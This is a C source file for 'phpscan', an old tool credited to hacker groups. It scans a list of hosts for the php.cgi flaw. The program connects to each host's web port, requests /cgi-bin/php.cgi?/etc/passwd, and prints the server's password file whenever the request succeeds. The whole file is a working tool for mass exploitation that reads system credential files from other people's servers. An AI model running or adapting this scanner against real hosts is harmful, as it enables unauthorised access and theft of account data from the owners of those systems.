/*

  phpscan.c : php.cgi vunerable server scanning program.
  
  Basically a phf scanner, by Alhambra of
  The Guild Corperation, optimise as you wish..

  Modifed by so1o@insecurity.org of CodeZero.

  Usage:
	phpscan < infile > outfile

*/

#include <sys/stat.h>
#include <sys/types.h>
#include <termios.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/syslog.h>
#include <sys/param.h>
#include <sys/times.h>
#ifdef LINUX
#include <sys/time.h>
#endif
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/signal.h>
#include <arpa/inet.h>
#include <netdb.h>
int FLAG = 1;
int Call(int signo)
{
 FLAG = 0;
}

main (int argc, char *argv[])
{
  char host[100], buffer[1024], hosta[1024],FileBuf[8097];
  int outsocket, serv_len, len,X,c,outfd;
  struct hostent *nametocheck;
  struct sockaddr_in serv_addr;
  struct in_addr outgoing;

  char PHPMessage[]="GET /cgi-bin/php.cgi?/etc/passwd HTTP/1.0\n\n";

  while(fgets(hosta,100,stdin))
    {
      if(hosta[0] == '\0')
      break;
      hosta[strlen(hosta) -1] = '\0';
      write(1,hosta,strlen(hosta)*sizeof(char));
      write(1,"\n",sizeof(char));
      outsocket = socket (AF_INET, SOCK_STREAM, 0);
      memset (&serv_addr, 0, sizeof (serv_addr));
      serv_addr.sin_family = AF_INET;
     
      nametocheck = gethostbyname (hosta);if(nametocheck==NULL) continue;

      (void *) memcpy (&outgoing.s_addr,       nametocheck->h_addr_list[0],sizeof       (outgoing.s_addr));
      strcpy (host, inet_ntoa (outgoing));
      serv_addr.sin_addr.s_addr = inet_addr (host);
      serv_addr.sin_port = htons (80);
      signal(SIGALRM,Call);
      FLAG = 1;

      alarm(10);    

      X=connect (outsocket, (struct sockaddr *)       &serv_addr, sizeof (serv_addr));
      alarm(0);
if(X==-1) continue;
      if(FLAG == 1 && X==0){
       write(outsocket,PHPMessage,strlen(PHPMessage)*sizeof(char));
       while((X=read(outsocket,FileBuf,8096))!=0)   if(FileBuf[9]=='2')      write(1,FileBuf,X);
       }
       close (outsocket);   
    }
  return 0;
}



